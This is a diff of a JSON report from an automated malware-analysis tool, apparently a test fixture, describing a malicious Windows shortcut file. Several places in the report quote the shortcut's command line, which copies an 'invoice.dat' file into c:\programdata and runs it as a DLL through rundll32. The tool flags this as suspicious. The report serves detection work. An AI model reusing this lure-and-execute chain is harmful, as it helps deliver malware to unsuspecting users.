@@ -1,42 +1,190 @@
 {
-    "response": {
-        "supplementary": [
-            "d2d7d7314146c2fc7be3c33d4809b25773ff7334aa2a0e0801f180b6c6e27534"
-        ],
-        "extracted": [
-            {
-                "name": "712c3723c1.ps1",
-                "sha256": "712c3723c177b371b577a71be6704685d8e0436e2d945db7a101c59ed3377414"
-            }
-        ]
-    },
-    "result": {
-        "heuristics": [
-            1,
-            5
-        ],
+  "extra": {
+    "drop_file": false,
+    "score": 501,
+    "sections": [
+      {
+        "auto_collapse": false,
+        "body": "{\"type\": \"colormap\", \"data\": {\"domain\": [0, 8], \"values\": [3.254162526001658, 2.847089260374425, 3.3454618442383204, 3.8393538721671994, 2.1123790309270203, 3.39546184423832, 2.769240704636848, 3.3454618442383204, 3.9192851864915057, 2.319517976278159, 3.06096404744368, 2.5209505944546677, 3.95869496956284, 3.0159614479285115, 2.619240704636848, 1.4324259543375337, 4.396439344671014, 3.8628148954723542, 2.9109640474436804, 2.9109640474436804, 2.5543474847814207, 2.7232196723355075, 2.7109640474436807, 2.96096404744368, 2.9109640474436804, 2.8920918598895935, 2.8609640474436806, 2.8609640474436806, 2.470950594454668, 3.756844121534166, 5.221928094887364, 4.721928094887362, 3.6219280948873607, 2.9659614479285117, 2.9609640474436802, 3.41588419980188, 2.569240704636848, 2.411609836167753, 2.0118373950396617, 3.706844121534166, 2.320950594454668, 2.2166422780956516, 2.319517976278159, 4.019285186491506, 2.620879970154579, 2.9609640474436802, 2.842091859889594, 3.4719280948873608, 1.9567796494470389, -0.0]}}",
+        "body_format": "GRAPH_DATA",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": null,
+        "tags": {},
+        "title_text": "File entropy: 4.437",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "{\"flags\": \"IDList, LinkInfo, RelativePath, CommandArgs, IconFile, Unicode, TargetMetadata\", \"file_attributes\": \"Archive\", \"create_date\": \"2020:11:06 17:26:06+00:00\", \"access_date\": \"2022:02:15 10:25:47+00:00\", \"modify_date\": \"2020:11:06 17:26:06+00:00\", \"target_file_size\": 452608, \"icon_index\": 5, \"run_window\": \"Normal\", \"hot_key\": \"(none)\", \"target_file_dosname\": \"powershell.exe\", \"drive_type\": \"Fixed Disk\", \"local_base_path\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"relative_path\": \"..\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"command_line_arguments\": \"cmd.exe /c xcopy /y invoice.dat c:\\\\programdata\\\\  && C:\\\\Windows\\\\System32\\\\rundll32.exe c:\\\\programdata\\\\invoice.dat,nmrecord\", \"icon_file_name\": \"%systemroot%\\\\system32\\\\imageres.dll\", \"machine_id\": \"desktop-i8bn9qk\"}",
+        "body_format": "KEY_VALUE",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": null,
         "tags": {
-            "file.date.creation": [
+          "file": {
+            "date": {
+              "creation": [
                 "2020:11:06 17:26:06+00:00"
-            ],
-            "file.date.last_modified": [
+              ],
+              "last_modified": [
                 "2020:11:06 17:26:06+00:00"
-            ],
-            "file.shortcut.icon_location": [
-                "%systemroot%\\system32\\imageres.dll"
-            ],
-            "file.shortcut.machine_id": [
-                "desktop-i8bn9qk"
-            ],
-            "file.shortcut.tracker_mac": [
-                "53:4E:57:00:00:00"
-            ],
-            "file.shortcut.command_line": [
-                "..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmd.exe /c xcopy /y invoice.dat c:\\programdata\\  && C:\\Windows\\System32\\rundll32.exe c:\\programdata\\invoice.dat,nmrecord"
-            ],
-            "file.name.extracted": [
+              ]
+            }
+          }
+        },
+        "title_text": "Metadata extracted by ExifTool",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_format": "TEXT",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": null,
+        "tags": {
+          "file": {
+            "name": {
+              "extracted": [
                 "powershell.exe"
-            ]
+              ]
+            },
+            "shortcut": {
+              "command_line": [
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmd.exe /c xcopy /y invoice.dat c:\\programdata\\  && C:\\Windows\\System32\\rundll32.exe c:\\programdata\\invoice.dat,nmrecord"
+              ],
+              "icon_location": [
+                "%systemroot%\\system32\\imageres.dll"
+              ],
+              "machine_id": [
+                "desktop-i8bn9qk"
+              ],
+              "tracker_mac": [
+                "53:4E:57:00:00:00"
+              ]
+            }
+          }
+        },
+        "title_text": "Extra metadata extracted by LnkParse3",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "{\"machine_identifier\": \"desktop-i8bn9qk\"}",
+        "body_format": "KEY_VALUE",
+        "classification": "TLP:W",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 5,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {},
+        "title_text": "Probably created in a VM",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "{\"command_line_arguments\": \"cmd.exe /c xcopy /y invoice.dat c:\\\\programdata\\\\  && C:\\\\Windows\\\\System32\\\\rundll32.exe c:\\\\programdata\\\\invoice.dat,nmrecord\", \"local_base_path\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"relative_path\": \"..\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"target_file_dosname\": \"Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"}",
+        "body_format": "KEY_VALUE",
+        "classification": "TLP:W",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 1,
+          "score": 500,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {},
+        "title_text": "Suspicious command line arguments",
+        "zeroize_on_tag_safe": false
+      }
+    ]
+  },
+  "files": {
+    "extracted": [
+      {
+        "name": "02fd9af4ce.ps1",
+        "sha256": "02fd9af4ceccc2774e20c9d27019fb0091d8929fba7548c93487abc08e9701c5"
+      }
+    ],
+    "supplementary": [
+      {
+        "name": "features.json",
+        "sha256": "d2d7d7314146c2fc7be3c33d4809b25773ff7334aa2a0e0801f180b6c6e27534"
+      }
+    ]
+  },
+  "results": {
+    "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 1,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 5,
+        "signatures": []
+      }
+    ],
+    "tags": {
+      "file.date.creation": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "2020:11:06 17:26:06+00:00"
         }
-    }
+      ],
+      "file.date.last_modified": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "2020:11:06 17:26:06+00:00"
+        }
+      ],
+      "file.name.extracted": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "powershell.exe"
+        }
+      ],
+      "file.shortcut.command_line": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmd.exe /c xcopy /y invoice.dat c:\\programdata\\  && C:\\Windows\\System32\\rundll32.exe c:\\programdata\\invoice.dat,nmrecord"
+        }
+      ],
+      "file.shortcut.icon_location": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "%systemroot%\\system32\\imageres.dll"
+        }
+      ],
+      "file.shortcut.machine_id": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "desktop-i8bn9qk"
+        }
+      ],
+      "file.shortcut.tracker_mac": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "53:4E:57:00:00:00"
+        }
+      ]
+    },
+    "temp_submission_data": {}
+  }
 }
